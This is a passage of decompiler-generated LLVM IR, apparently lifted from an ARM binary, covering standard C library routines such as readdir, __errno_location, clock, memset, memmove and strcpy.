  %v2_11a5c = call i32 @__libc_fcntl(i32 %v0_11a54, i32 3)
  %v7_11a60 = icmp eq i32 %v2_11a5c, -1
  br i1 %v7_11a60, label %dec_label_pc_11aa4, label %dec_label_pc_11a68

dec_label_pc_11a68:                               ; preds = %dec_label_pc_11a54
  %v1_11a68 = urem i32 %v2_11a5c, 4
  store i32 %v1_11a68, i32* %r3.global-to-local, align 4
  %v7_11a6c = icmp eq i32 %v1_11a68, 1
  br i1 %v7_11a6c, label %dec_label_pc_11a74, label %dec_label_pc_11a90

dec_label_pc_11a74:                               ; preds = %dec_label_pc_11a68
  %v0_11a78 = call i32 @__aeabi_read_tp()
  %v3_11a7c = load i16, i16* @global_var_2229c.359, align 2
  %v0_11a80 = load i32, i32* @r5, align 4
  store i32 %v0_11a80, i32* %r1.global-to-local, align 4
  %v0_11a84 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a84 = add i32 %v0_11a84, 21
  br label %dec_label_pc_11a88

dec_label_pc_11a88:                               ; preds = %dec_label_pc_11a3c, %dec_label_pc_11a74
  %v2_11a88.in = phi i16 [ %v3_11a44, %dec_label_pc_11a3c ], [ %v3_11a7c, %dec_label_pc_11a74 ]
  %v1_11a88 = phi i32 [ %v0_11a40, %dec_label_pc_11a3c ], [ %v0_11a78, %dec_label_pc_11a74 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_11a3c ], [ %v1_11a84, %dec_label_pc_11a74 ]
  %v2_11a88 = sext i16 %v2_11a88.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_11a88 = add i32 %v1_11a88, %v2_11a88
  %v4_11a88 = inttoptr i32 %v3_11a88 to i32*
  store i32 %storemerge, i32* %v4_11a88, align 4
  %v0_11aa8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11aa8

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11a68
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_11a94 = load i32, i32* @r4, align 4
  %v2_11a98 = call i32 @fd_to_DIR(i32 %v0_11a94, i32 %tmp)
  store i32 %v2_11a98, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11aa8

dec_label_pc_11aa4:                               ; preds = %entry, %dec_label_pc_11a54
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11aa8

dec_label_pc_11aa8:                               ; preds = %dec_label_pc_11a90, %dec_label_pc_11a88, %dec_label_pc_11aa4
  %v0_11aa8 = phi i32 [ %v2_11a98, %dec_label_pc_11a90 ], [ %v0_11aa8.pre, %dec_label_pc_11a88 ], [ 0, %dec_label_pc_11aa4 ]
  ret i32 %v0_11aa8

; uselistorder directives
  uselistorder i32 %v1_11a68, { 1, 0 }
  uselistorder i32 %v2_11a5c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 6, 0, 7, 8, 5, 1, 2, 3, 4 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_11aa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11aa4, { 1, 0 }
  uselistorder label %dec_label_pc_11a88, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_11ac0 = load i32, i32* @r4, align 4
  %v6_11ac0 = load i32, i32* @r5, align 4
  %v9_11ac0 = load i32, i32* @r6, align 4
  %v12_11ac0 = load i32, i32* @r7, align 4
  %v15_11ac0 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r6, align 4
  %v1_11ad4 = add i32 %tmp, 24
  store i32 %v1_11ad4, i32* @r4, align 4
  %v4_11ad8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 68) to i32*), align 4
  store i32 %v4_11ad8, i32* %r1.global-to-local, align 4
  store i32 %v1_11ad4, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_11aec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11aec)
  %v0_11b00 = load i32, i32* @r6, align 4
  %v2_11b00 = add i32 %v0_11b00, 16
  %v3_11b00 = inttoptr i32 %v2_11b00 to i32*
  %v4_11b00 = load i32, i32* %v3_11b00, align 4
  store i32 %v4_11b00, i32* @ip, align 4
  store i32 72460, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11b00)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11b40, %entry
  %v0_11b10 = load i32, i32* @r5, align 4
  %v1_11b10 = add i32 %v0_11b10, 4
  %v2_11b10 = inttoptr i32 %v1_11b10 to i32*
  %v3_11b10 = load i32, i32* %v2_11b10, align 4
  store i32 %v3_11b10, i32* %r2.global-to-local, align 4
  %v4_11b10 = add i32 %v0_11b10, 8
  %v5_11b10 = inttoptr i32 %v4_11b10 to i32*
  %v6_11b10 = load i32, i32* %v5_11b10, align 4
  %tmp10 = icmp ugt i32 %v6_11b10, %v3_11b10
  br i1 %tmp10, label %dec_label_pc_11b40, label %dec_label_pc_11b1c

dec_label_pc_11b1c:                               ; preds = %dec_label_pc_11b10
  %v1_11b1c = inttoptr i32 %v0_11b10 to i32*
  %v2_11b1c = load i32, i32* %v1_11b1c, align 4
  %v1_11b20 = add i32 %v0_11b10, 12
  %v2_11b20 = inttoptr i32 %v1_11b20 to i32*
  %v3_11b20 = load i32, i32* %v2_11b20, align 4
  store i32 %v3_11b20, i32* %r1.global-to-local, align 4
  %v1_11b24 = add i32 %v0_11b10, 20
  %v2_11b24 = inttoptr i32 %v1_11b24 to i32*
  %v3_11b24 = load i32, i32* %v2_11b24, align 4
  store i32 %v3_11b24, i32* %r2.global-to-local, align 4
  %v4_11b28 = call i32 @__getdents(i32 %v2_11b1c, i32 %v3_11b20, i32 %v3_11b24, i32 %v6_11b10)
  %tmp9 = icmp slt i32 %v4_11b28, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_11b38

.thread:                                          ; preds = %dec_label_pc_11b1c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11b6c

dec_label_pc_11b38:                               ; preds = %dec_label_pc_11b1c
  %v1_11b38 = load i32, i32* @r5, align 4
  %v2_11b38 = add i32 %v1_11b38, 8
  %v3_11b38 = inttoptr i32 %v2_11b38 to i32*
  store i32 %v4_11b28, i32* %v3_11b38, align 4
  %v0_11b3c = load i32, i32* @r7, align 4
  %v1_11b3c = load i32, i32* @r5, align 4
  %v2_11b3c = add i32 %v1_11b3c, 4
  %v3_11b3c = inttoptr i32 %v2_11b3c to i32*
  store i32 %v0_11b3c, i32* %v3_11b3c, align 4
  %v0_11b40.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11b40

dec_label_pc_11b40:                               ; preds = %dec_label_pc_11b10, %dec_label_pc_11b38
  %v1_11b50 = phi i32 [ %v0_11b10, %dec_label_pc_11b10 ], [ %v0_11b40.pre, %dec_label_pc_11b38 ]
  %v1_11b40 = add i32 %v1_11b50, 4
  %v2_11b40 = inttoptr i32 %v1_11b40 to i32*
  %v3_11b40 = load i32, i32* %v2_11b40, align 4
  store i32 %v3_11b40, i32* %r2.global-to-local, align 4
  %v1_11b44 = add i32 %v1_11b50, 12
  %v2_11b44 = inttoptr i32 %v1_11b44 to i32*
  %v3_11b44 = load i32, i32* %v2_11b44, align 4
  store i32 %v3_11b44, i32* %r1.global-to-local, align 4
  %v2_11b48 = add i32 %v3_11b44, %v3_11b40
  store i32 %v2_11b48, i32* @r4, align 4
  %v1_11b4c = add i32 %v2_11b48, 4
  %v2_11b4c = inttoptr i32 %v1_11b4c to i32*
  %v3_11b4c = load i32, i32* %v2_11b4c, align 4
  %v2_11b50 = add i32 %v1_11b50, 16
  %v3_11b50 = inttoptr i32 %v2_11b50 to i32*
  store i32 %v3_11b4c, i32* %v3_11b50, align 4
  %v0_11b54 = load i32, i32* @r4, align 4
  %v1_11b54 = add i32 %v0_11b54, 8
  %v2_11b54 = inttoptr i32 %v1_11b54 to i16*
  %v3_11b54 = load i16, i16* %v2_11b54, align 2
  %v4_11b54 = zext i16 %v3_11b54 to i32
  %v0_11b58 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b58 = load i32, i32* %r1.global-to-local, align 4
  %v2_11b58 = add i32 %v1_11b58, %v0_11b58
  %v3_11b58 = inttoptr i32 %v2_11b58 to i32*
  %v4_11b58 = load i32, i32* %v3_11b58, align 4
  store i32 %v4_11b58, i32* %r1.global-to-local, align 4
  %v2_11b5c = add i32 %v0_11b58, %v4_11b54
  %v2_11b60 = icmp eq i32 %v4_11b58, 0
  %v1_11b64 = load i32, i32* @r5, align 4
  %v2_11b64 = add i32 %v1_11b64, 4
  %v3_11b64 = inttoptr i32 %v2_11b64 to i32*
  store i32 %v2_11b5c, i32* %v3_11b64, align 4
  br i1 %v2_11b60, label %dec_label_pc_11b10, label %dec_label_pc_11b6c

dec_label_pc_11b6c:                               ; preds = %dec_label_pc_11b40, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_11b78 = load i32, i32* @r6, align 4
  %v2_11b78 = add i32 %v0_11b78, 44
  %v3_11b78 = inttoptr i32 %v2_11b78 to i32*
  %v4_11b78 = load i32, i32* %v3_11b78, align 4
  call void @__pseudo_branch(i32 %v4_11b78)
  %v0_11b84 = load i32, i32* @r4, align 4
  store i32 %v3_11ac0, i32* @r4, align 4
  store i32 %v6_11ac0, i32* @r5, align 4
  store i32 %v9_11ac0, i32* @r6, align 4
  store i32 %v12_11ac0, i32* @r7, align 4
  store i32 %v15_11ac0, i32* @lr, align 4
  ret i32 %v0_11b84

; uselistorder directives
  uselistorder i32 %v1_11b50, { 0, 2, 1 }
  uselistorder i32 %v6_11b10, { 1, 0 }
  uselistorder i32 %v0_11b10, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_11b40, { 1, 0 }
}

define i32 @function_11b98(i32 %arg1) local_unnamed_addr {
dec_label_pc_11b98:
  %v0_11b98 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11b98, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11b98
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11b98, %bb
  %v4_11ba4 = phi i32 [ %arg1, %dec_label_pc_11b98 ], [ 0, %bb ]
  ret i32 %v4_11ba4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_11ba8 = load i32, i32* @lr, align 4
  %v0_11bb0 = call i32 @__aeabi_read_tp()
  %v3_11bb4 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11bb4 = sext i16 %v3_11bb4 to i32
  %v2_11bb8 = add i32 %v4_11bb4, %v0_11bb0
  store i32 %v0_11ba8, i32* @lr, align 4
  ret i32 %v2_11bb8
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_11bcc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11bcc, i32* @r0, align 4
  %v1_11bd4 = call i32 @times(i32 %v2_11bcc)
  %v2_11bd8 = load i32, i32* %stack_var_-24, align 4
  %v2_11bdc = add i32 %v2_11bd8, %tmp
  %v2_11be4 = mul i32 %v2_11bdc, 10000
  %v1_11be8 = and i32 %v2_11be4, 2147483632
  ret i32 %v1_11be8

; uselistorder directives
  uselistorder i32 %v2_11bcc, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1) local_unnamed_addr {
dec_label_pc_11bf8:
  %v0_11bf8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11bf8, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_11bf8
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_11bf8, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11c00 = call i32 @_memcpy()
  ret i32 %v0_11c00
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_11c10 = call i32 @_memcpy()
  ret i32 %v0_11c10

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_11c24 = icmp eq i32 %arg3, 8
  store i1 %v8_11c24, i1* %cpsr_z.global-to-local, align 1
  %v5_11c28 = icmp slt i32 %arg3, 8
  br i1 %v5_11c28, label %dec_label_pc_11c88, label %dec_label_pc_11c2c

dec_label_pc_11c2c:                               ; preds = %entry
  %v4_11c2c = mul i32 %arg2, 256
  %v5_11c2c = or i32 %v4_11c2c, %arg2
  %v4_11c30 = mul i32 %v5_11c2c, 65536
  %v5_11c30 = or i32 %v4_11c30, %v5_11c2c
  store i32 %v5_11c30, i32* @r1, align 4
  %v1_11c3457 = urem i32 %tmp, 4
  %v2_11c3458 = icmp eq i32 %v1_11c3457, 0
  store i1 %v2_11c3458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_11c3458, label %dec_label_pc_11c44, label %bb

bb:                                               ; preds = %dec_label_pc_11c2c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_11c2c ]
  %v3_11c3859 = phi i32 [ %v6_11c38, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_11c2c ]
  %v4_11c38 = inttoptr i32 %v3_11c3859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11c38, align 1
  %v5_11c38 = load i32, i32* @r3, align 4
  %v6_11c38 = add i32 %v5_11c38, 1
  store i32 %v6_11c38, i32* @r3, align 4
  %v0_11c3c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11c48.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_11c3c.pr, label %dec_label_pc_11c44, label %.thread

.thread:                                          ; preds = %bb
  %v2_11c3c = add i32 %v0_11c48.pr.pre, -1
  store i32 %v2_11c3c, i32* %r2.global-to-local, align 4
  %v1_11c34 = urem i32 %v6_11c38, 4
  %v2_11c34 = icmp eq i32 %v1_11c34, 0
  store i1 %v2_11c34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c34, label %dec_label_pc_11c44, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11c38.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_11c38.pre to i8
  br label %bb

dec_label_pc_11c44:                               ; preds = %.thread, %bb, %dec_label_pc_11c2c
  %v0_11c5028 = phi i32 [ %tmp, %dec_label_pc_11c2c ], [ %v6_11c38, %bb ], [ %v6_11c38, %.thread ]
  %v0_11c48.pr = phi i32 [ %arg3, %dec_label_pc_11c2c ], [ %v0_11c48.pr.pre, %bb ], [ %v2_11c3c, %.thread ]
  %v0_11c44 = load i32, i32* @r1, align 4
  store i32 %v0_11c44, i32* %ip.global-to-local, align 4
  %v8_11c4810 = icmp eq i32 %v0_11c48.pr, 8
  store i1 %v8_11c4810, i1* %cpsr_z.global-to-local, align 1
  %v5_11c4c11 = icmp slt i32 %v0_11c48.pr, 8
  br i1 %v5_11c4c11, label %dec_label_pc_11c88, label %dec_label_pc_11c50.preheader

dec_label_pc_11c50.preheader:                     ; preds = %dec_label_pc_11c44
  %v1_11c5046 = inttoptr i32 %v0_11c5028 to i32*
  store i32 %v0_11c44, i32* %v1_11c5046, align 4
  %v3_11c5047 = add i32 %v0_11c5028, 4
  %v4_11c5048 = inttoptr i32 %v3_11c5047 to i32*
  %v5_11c5049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c5049, i32* %v4_11c5048, align 4
  %v6_11c5050 = add i32 %v0_11c5028, 8
  store i32 %v6_11c5050, i32* @r3, align 4
  %v0_11c5451 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c5452 = add i32 %v0_11c5451, -8
  store i32 %v1_11c5452, i32* %r2.global-to-local, align 4
  %v5_11c5c53 = icmp slt i32 %v1_11c5452, 8
  br i1 %v5_11c5c53, label %dec_label_pc_11c50.dec_label_pc_11c88.loopexit_crit_edge, label %dec_label_pc_11c60

dec_label_pc_11c60:                               ; preds = %dec_label_pc_11c50.preheader, %dec_label_pc_11c48.dec_label_pc_11c50_crit_edge
  %v6_11c5055 = phi i32 [ %v6_11c50, %dec_label_pc_11c48.dec_label_pc_11c50_crit_edge ], [ %v6_11c5050, %dec_label_pc_11c50.preheader ]
  %v0_11c5054 = phi i32 [ %v12_11c7c, %dec_label_pc_11c48.dec_label_pc_11c50_crit_edge ], [ %v0_11c5028, %dec_label_pc_11c50.preheader ]
  %v1_11c60 = inttoptr i32 %v6_11c5055 to i32*
  %v2_11c60 = load i32, i32* @r1, align 4
  store i32 %v2_11c60, i32* %v1_11c60, align 4
  %v3_11c60 = add i32 %v0_11c5054, 12
  %v4_11c60 = inttoptr i32 %v3_11c60 to i32*
  %v5_11c60 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c60, i32* %v4_11c60, align 4
  %v6_11c60 = add i32 %v0_11c5054, 16
  store i32 %v6_11c60, i32* @r3, align 4
  %v0_11c64 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c64 = add i32 %v0_11c64, -8
  store i32 %v1_11c64, i32* %r2.global-to-local, align 4
  %v5_11c6c = icmp slt i32 %v1_11c64, 8
  br i1 %v5_11c6c, label %dec_label_pc_11c60.dec_label_pc_11c88.loopexit_crit_edge, label %dec_label_pc_11c70

dec_label_pc_11c70:                               ; preds = %dec_label_pc_11c60
  %v1_11c70 = inttoptr i32 %v6_11c60 to i32*
  %v2_11c70 = load i32, i32* @r1, align 4
  store i32 %v2_11c70, i32* %v1_11c70, align 4
  %v3_11c70 = add i32 %v0_11c5054, 20
  %v4_11c70 = inttoptr i32 %v3_11c70 to i32*
  %v5_11c70 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c70, i32* %v4_11c70, align 4
  %v6_11c70 = add i32 %v0_11c5054, 24
  store i32 %v6_11c70, i32* @r3, align 4
  %v0_11c74 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c74 = add i32 %v0_11c74, -8
  store i32 %v1_11c74, i32* %r2.global-to-local, align 4
  %v5_11c7c = icmp slt i32 %v1_11c74, 8
  br i1 %v5_11c7c, label %dec_label_pc_11c70.dec_label_pc_11c88.loopexit_crit_edge, label %dec_label_pc_11c48

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c70
  %v7_11c7c = inttoptr i32 %v6_11c70 to i32*
  %v8_11c7c = load i32, i32* @r1, align 4
  store i32 %v8_11c7c, i32* %v7_11c7c, align 4
  %v9_11c7c = add i32 %v0_11c5054, 28
  %v10_11c7c = inttoptr i32 %v9_11c7c to i32*
  %v11_11c7c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_11c7c, i32* %v10_11c7c, align 4
  %v12_11c7c = add i32 %v0_11c5054, 32
  store i32 %v12_11c7c, i32* @r3, align 4
  %v6_11c80 = load i32, i32* %r2.global-to-local, align 4
  %v7_11c80 = add i32 %v6_11c80, -8
  store i32 %v7_11c80, i32* %r2.global-to-local, align 4
  %v5_11c4c = icmp slt i32 %v7_11c80, 8
  br i1 %v5_11c4c, label %dec_label_pc_11c48.dec_label_pc_11c88.loopexit_crit_edge, label %dec_label_pc_11c48.dec_label_pc_11c50_crit_edge

dec_label_pc_11c48.dec_label_pc_11c50_crit_edge:  ; preds = %dec_label_pc_11c48
  %v2_11c50.pre = load i32, i32* @r1, align 4
  %v1_11c50 = inttoptr i32 %v12_11c7c to i32*
  store i32 %v2_11c50.pre, i32* %v1_11c50, align 4
  %v3_11c50 = add i32 %v0_11c5054, 36
  %v4_11c50 = inttoptr i32 %v3_11c50 to i32*
  %v5_11c50 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c50, i32* %v4_11c50, align 4
  %v6_11c50 = add i32 %v0_11c5054, 40
  store i32 %v6_11c50, i32* @r3, align 4
  %v0_11c54 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c54 = add i32 %v0_11c54, -8
  store i32 %v1_11c54, i32* %r2.global-to-local, align 4
  %v5_11c5c = icmp slt i32 %v1_11c54, 8
  br i1 %v5_11c5c, label %dec_label_pc_11c50.dec_label_pc_11c88.loopexit_crit_edge, label %dec_label_pc_11c60

dec_label_pc_11c48.dec_label_pc_11c88.loopexit_crit_edge: ; preds = %dec_label_pc_11c48
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c88

dec_label_pc_11c50.dec_label_pc_11c88.loopexit_crit_edge: ; preds = %dec_label_pc_11c48.dec_label_pc_11c50_crit_edge, %dec_label_pc_11c50.preheader
  %v1_11c54.lcssa = phi i32 [ %v1_11c5452, %dec_label_pc_11c50.preheader ], [ %v1_11c54, %dec_label_pc_11c48.dec_label_pc_11c50_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c88

dec_label_pc_11c60.dec_label_pc_11c88.loopexit_crit_edge: ; preds = %dec_label_pc_11c60
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c88

dec_label_pc_11c70.dec_label_pc_11c88.loopexit_crit_edge: ; preds = %dec_label_pc_11c70
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c88

dec_label_pc_11c88:                               ; preds = %dec_label_pc_11c44, %dec_label_pc_11c48.dec_label_pc_11c88.loopexit_crit_edge, %dec_label_pc_11c50.dec_label_pc_11c88.loopexit_crit_edge, %dec_label_pc_11c60.dec_label_pc_11c88.loopexit_crit_edge, %dec_label_pc_11c70.dec_label_pc_11c88.loopexit_crit_edge, %entry
  %v0_11c90 = phi i32 [ %arg3, %entry ], [ %v1_11c74, %dec_label_pc_11c70.dec_label_pc_11c88.loopexit_crit_edge ], [ %v1_11c64, %dec_label_pc_11c60.dec_label_pc_11c88.loopexit_crit_edge ], [ %v1_11c54.lcssa, %dec_label_pc_11c50.dec_label_pc_11c88.loopexit_crit_edge ], [ %v7_11c80, %dec_label_pc_11c48.dec_label_pc_11c88.loopexit_crit_edge ], [ %v0_11c48.pr, %dec_label_pc_11c44 ]
  %v2_11c88 = icmp eq i32 %v0_11c90, 0
  store i1 %v2_11c88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c88, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11c88
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11c88
  %v1_11c90 = sub i32 7, %v0_11c90
  store i32 %v1_11c90, i32* %r2.global-to-local, align 4
  %v3_11c94 = mul i32 %v1_11c90, 4
  %v4_11c94 = add i32 %v3_11c94, ptrtoint (i32* @global_var_11c9c.404 to i32)
  call void @__pseudo_branch(i32 %v4_11c94)
  %v0_11c9c = load i32, i32* @r1, align 4
  %v1_11c9c = trunc i32 %v0_11c9c to i8
  %v2_11c9c = load i32, i32* @r3, align 4
  %v3_11c9c = inttoptr i32 %v2_11c9c to i8*
  store i8 %v1_11c9c, i8* %v3_11c9c, align 1
  %v4_11c9c = load i32, i32* @r3, align 4
  %v5_11c9c = add i32 %v4_11c9c, 1
  store i32 %v5_11c9c, i32* %r3.global-to-local, align 4
  %v0_11ca0 = load i32, i32* @r1, align 4
  %v1_11ca0 = trunc i32 %v0_11ca0 to i8
  %v3_11ca0 = inttoptr i32 %v5_11c9c to i8*
  store i8 %v1_11ca0, i8* %v3_11ca0, align 1
  %v4_11ca0 = load i32, i32* %r3.global-to-local, align 4
  %v5_11ca0 = add i32 %v4_11ca0, 1
  store i32 %v5_11ca0, i32* %r3.global-to-local, align 4
  %v0_11ca4 = load i32, i32* @r1, align 4
  %v1_11ca4 = trunc i32 %v0_11ca4 to i8
  %v3_11ca4 = inttoptr i32 %v5_11ca0 to i8*
  store i8 %v1_11ca4, i8* %v3_11ca4, align 1
  %v4_11ca4 = load i32, i32* %r3.global-to-local, align 4
  %v5_11ca4 = add i32 %v4_11ca4, 1
  store i32 %v5_11ca4, i32* %r3.global-to-local, align 4
  %v0_11ca8 = load i32, i32* @r1, align 4
  %v1_11ca8 = trunc i32 %v0_11ca8 to i8
  %v3_11ca8 = inttoptr i32 %v5_11ca4 to i8*
  store i8 %v1_11ca8, i8* %v3_11ca8, align 1
  %v4_11ca8 = load i32, i32* %r3.global-to-local, align 4
  %v5_11ca8 = add i32 %v4_11ca8, 1
  store i32 %v5_11ca8, i32* %r3.global-to-local, align 4
  %v0_11cac = load i32, i32* @r1, align 4
  %v1_11cac = trunc i32 %v0_11cac to i8
  %v3_11cac = inttoptr i32 %v5_11ca8 to i8*
  store i8 %v1_11cac, i8* %v3_11cac, align 1
  %v4_11cac = load i32, i32* %r3.global-to-local, align 4
  %v5_11cac = add i32 %v4_11cac, 1
  store i32 %v5_11cac, i32* %r3.global-to-local, align 4
  %v0_11cb0 = load i32, i32* @r1, align 4
  %v1_11cb0 = trunc i32 %v0_11cb0 to i8
  %v3_11cb0 = inttoptr i32 %v5_11cac to i8*
  store i8 %v1_11cb0, i8* %v3_11cb0, align 1
  %v4_11cb0 = load i32, i32* %r3.global-to-local, align 4
  %v5_11cb0 = add i32 %v4_11cb0, 1
  store i32 %v5_11cb0, i32* %r3.global-to-local, align 4
  %v0_11cb4 = load i32, i32* @r1, align 4
  %v1_11cb4 = trunc i32 %v0_11cb4 to i8
  %v3_11cb4 = inttoptr i32 %v5_11cb0 to i8*
  store i8 %v1_11cb4, i8* %v3_11cb4, align 1
  %v4_11cb4 = load i32, i32* %r3.global-to-local, align 4
  %v5_11cb4 = add i32 %v4_11cb4, 1
  store i32 %v5_11cb4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11c50, { 1, 0 }
  uselistorder i32 %v12_11c7c, { 1, 2, 0 }
  uselistorder i32 %v0_11c5054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11c48.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11c38, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_11c2c, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 12, 13, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 2, 5, 0, 9, 8, 1, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11c88, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11c60, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_11cd01 = load i32, i32* @r1, align 4
  %v1_11cd02 = inttoptr i32 %v0_11cd01 to i8*
  %v2_11cd03 = load i8, i8* %v1_11cd02, align 1
  %v2_11cd45 = icmp eq i8 %v2_11cd03, 0
  store i1 %v2_11cd45, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_11cd03, i8* %arg1, align 1
  br i1 %v2_11cd45, label %dec_label_pc_11ce0, label %dec_label_pc_11cc8

dec_label_pc_11cc8:                               ; preds = %entry, %dec_label_pc_11cc8
  %v0_11cc8 = load i32, i32* @r1, align 4
  %v1_11cc8 = add i32 %v0_11cc8, 1
  store i32 %v1_11cc8, i32* @r1, align 4
  %v0_11ccc = load i32, i32* %r2.global-to-local, align 4
  %v1_11ccc = add i32 %v0_11ccc, 1
  store i32 %v1_11ccc, i32* %r2.global-to-local, align 4
  %v1_11cd0 = inttoptr i32 %v1_11cc8 to i8*
  %v2_11cd0 = load i8, i8* %v1_11cd0, align 1
  %v2_11cd4 = icmp eq i8 %v2_11cd0, 0
  store i1 %v2_11cd4, i1* %cpsr_z.global-to-local, align 1
  %v3_11cd8 = inttoptr i32 %v1_11ccc to i8*
  store i8 %v2_11cd0, i8* %v3_11cd8, align 1
  %v0_11cdc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11cdc, label %dec_label_pc_11ce0, label %dec_label_pc_11cc8

dec_label_pc_11ce0:                               ; preds = %dec_label_pc_11cc8, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
